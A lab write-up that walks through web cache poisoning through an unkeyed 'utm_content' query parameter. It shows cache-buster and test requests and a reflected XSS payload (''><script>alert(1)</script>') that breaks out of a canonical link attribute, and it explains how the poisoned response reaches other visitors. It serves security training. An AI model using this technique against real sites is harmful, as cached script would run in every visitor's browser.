# Web Cache Poisoning via an Unkeyed Query Parameter


## Overview



This lab demonstrates **Web Cache Poisoning** caused by a query parameter that is reflected in the response but excluded 
from the cache key.



The goal is to poison the homepage cache with an XSS payload that executes:



```javascript

alert(1)

```



---



## 1. Identify the Cache Behavior


The homepage acts as a **cache oracle**.



Changing the query string initially caused:


```http

X-Cache: miss

```



Repeating the same request resulted in:



```http

X-Cache: hit

```



The query string was also reflected in the response.



---



## 2. Add a Cache Buster



A cache buster can be used to force a new cache entry:



```http

GET /?cb=12345 HTTP/2

```



---



## 3. Find an Unkeyed Parameter



Using:



**Burp Suite → Param Miner → Guess GET parameters**



we discovered:



```text

utm_content

```



---



## 4. Confirm It Is Unkeyed



Test:



```http

GET /?cb=12345&utm_content=test HTTP/2

```



The response returned:



```http

X-Cache: hit

```



while `utm_content` was reflected in the HTML:



```html

<link rel="canonical"

href='//target/?cb=12345&utm_content=test'/>

```



This indicates that `utm_content` affects the response but is excluded from the cache key.



---



## 5. Inject XSS



The parameter was reflected inside a single-quoted HTML attribute.



Payload:



```html

'><script>alert(1)</script>

```



Example request:



```http

GET /?utm_content='jjklmnjkl'/><script>alert(1)</script> HTTP/2

```



The payload was reflected into the response, breaking out of the `href` attribute and injecting a `<script>` tag.



---



## 6. Poison the Cache



Because `utm_content` is **unkeyed**, the malicious response can be stored in the cache.



The attack flow is:



```text

Unkeyed parameter
        ↓
Reflected in response

        ↓

Inject XSS payload

        ↓

Response gets cached

        ↓

Victim receives poisoned response



        ↓
alert(1)

```



---



## Key Takeaway




A useful pattern for identifying this vulnerability is:



```text

Unkeyed Parameter

        +
Reflected Input

        +
Cacheable Response


        =

Web Cache Poisoning

```


### Payload



```html

'><script>alert(1)</script>

```



### Vulnerable Parameter





```text

utm_content

```
